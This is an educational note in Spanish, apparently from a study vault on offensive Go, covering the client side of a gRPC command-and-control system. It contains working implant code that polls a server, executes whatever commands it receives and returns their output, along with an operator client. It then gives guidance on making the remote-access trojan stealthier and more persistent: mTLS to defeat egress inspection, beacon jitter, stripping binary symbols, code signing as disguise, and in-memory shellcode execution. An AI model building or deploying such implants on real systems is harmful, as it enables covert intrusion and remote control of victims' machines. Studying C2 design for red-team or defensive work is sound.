---
tags:
  - Go
  - Go/C2
  - Post-Explotacion
  - Evasion
Fecha de actualización: 2026-07-25
Nota previa: "[[01 - El servidor C2 - proxy con channels]]"
Nota siguiente: ""
Area: "[[Command and Control.base|Command and Control]]"
---
---

Faltan los dos clientes gRPC del [[01 - El servidor C2 - proxy con channels|servidor]]: el **implante** (en la víctima, ejecuta) y el **admin** (el operador, ordena). Ambos son cortos —el código pesado lo generó `protoc`— y comparten el patrón de cliente. Lo interesante es qué le falta al RAT del libro para ser algo más que un juguete didáctico.

## El implante

Se conecta al servidor, y en un bucle infinito **sondea** pidiendo trabajo; si lo hay, ejecuta y devuelve la salida:

```go
conn, err := grpc.NewClient("localhost:4444",
    grpc.WithTransportCredentials(insecure.NewCredentials()))   // ver modernización
if err != nil {
    log.Fatal(err)
}
defer conn.Close()
client := grpcapi.NewImplantClient(conn)

for {
    cmd, err := client.FetchCommand(context.Background(), &grpcapi.Empty{})
    if err != nil {
        log.Fatal(err)
    }
    if cmd.In == "" {
        time.Sleep(3 * time.Second)      // sin trabajo: espera y reintenta (beaconing)
        continue
    }
    tokens := strings.Split(cmd.In, " ")             // separar comando y argumentos
    out, err := exec.Command(tokens[0], tokens[1:]...).CombinedOutput()
    if err != nil {
        cmd.Out = err.Error()
    }
    cmd.Out += string(out)
    client.SendOutput(context.Background(), cmd)      // devolver la salida
}
```

<mark style="background: #FFB8EBA6;">`exec.Command(name, args...)` separa el comando de sus argumentos a propósito</mark>: Go no lo pasa por un shell, lo que evita la inyección de comandos — pero obliga a partir la cadena tú (`strings.Split`). El split ingenuo por espacios se rompe con comillas o *pipes* (`ls -la | wc -l` no funciona); para encadenar comandos hay que manipular `stdin`/`stdout` con `io.Pipe`.

## El admin

Trivial: manda un comando y espera el resultado.

```go
conn, _ := grpc.NewClient("localhost:9090", grpc.WithTransportCredentials(insecure.NewCredentials()))
defer conn.Close()
client := grpcapi.NewAdminClient(conn)

cmd, err := client.RunCommand(context.Background(), &grpcapi.Command{In: os.Args[1]})
if err != nil {
    log.Fatal(err)
}
fmt.Println(cmd.Out)
```

## Modernización: el cliente gRPC del libro está obsoleto

> [!warning]+ `grpc.Dial` → `grpc.NewClient`, y adiós a `WithInsecure`
> El libro (2020) usa `grpc.Dial` + `grpc.WithInsecure()`. Ambos están **deprecados** en el gRPC-Go actual:
> - <mark style="background: #FF5582A6;">`grpc.Dial` → `grpc.NewClient`</mark> (conexión perezosa, mejor gestión del ciclo de vida).
> - `grpc.WithInsecure()` → `grpc.WithTransportCredentials(insecure.NewCredentials())` — explícito en que **no hay cifrado**, que es lo que hay que arreglar.
> - `context.Background()` en cada llamada → **`context.WithTimeout`**: sin *deadline*, un servidor lento cuelga la goroutine para siempre.

## Endurecer el RAT (lo que lo separa de un juguete)

El propio libro lo admite: el RAT es "simple and unpolished". Lo que le falta —y que es donde está el trabajo real— toca conceptos de todo el libro:

> [!important]+ Cifrado y autenticación
> `WithInsecure` manda todo en claro; <mark style="background: #FFB86CA6;">cualquier monitorización de egress lo ve</mark>. Un C2 real usa **TLS**, e idealmente **mTLS** (autenticación mutua): así el implante verifica al servidor y viceversa, y un proxy de inspección sin el certificado de cliente no puede interceptar. Es exactamente el `tls.Config` de [[04 - Autenticación mutua con TLS]]. La pregunta difícil —dónde guardar las claves del implante— no tiene respuesta cómoda (¿hardcoded? ¿derivadas en runtime?), y es una decisión de OPSEC.

> [!important]+ Resiliencia, escala y persistencia
> - **Reconexión**: tal cual, el implante muere (`log.Fatal`) si se cae la conexión — y pierdes el acceso. Hay que reintentar `grpc.NewClient` en bucle con *backoff*.
> - **Múltiples implantes**: registrar cada uno con un UUID (`google/uuid`) y persistir el mapeo en una BBDD ([[00 - Bases de datos SQL - database-sql|SQLite]]) para sobrevivir a reinicios del servidor.
> - **Funcionalidad**: subir/descargar ficheros, o ejecutar shellcode en memoria sin tocar disco ([[01 - Process injection clásica]]).

> [!warning]+ OPSEC del binario
> El *beaconing* fijo cada 3 s es un patrón detectable por su **regularidad** — un C2 serio añade *jitter* (intervalo aleatorio). Y el binario Go delata: las rutas de paquetes quedan embebidas (pueden llevar a ti), y lleva símbolos de depuración. <mark style="background: #8000E1A6;">Compilar con `go build -ldflags="-s -w"`</mark> quita la info de debug y los símbolos — binario más pequeño y más difícil de desensamblar. Un certificado legítimo (no autofirmado) y *code signing* completan el disfraz. El desarrollo operativo de todo esto es Red Team, no esta nota.

> [!info]+ Por qué Go para un implante
> Go compila a un **binario estático cross-platform** sin dependencias — ideal para dropear en cualquier objetivo. El precio: binarios grandes (~2 MB, el runtime va dentro), lo que puede complicar la entrega. Para servicios de *backend* (el servidor C2), Go es difícil de superar.

Con esto cierras el arco de Go ofensivo del libro: de un escáner TCP a un C2 completo, pasando por sniffing, exploits, cripto y Windows. Lo que queda es transversal — el arsenal de herramientas y las consideraciones de OPSEC que atraviesan todos los temas → carpeta `14 - Arsenal y OPSEC`.
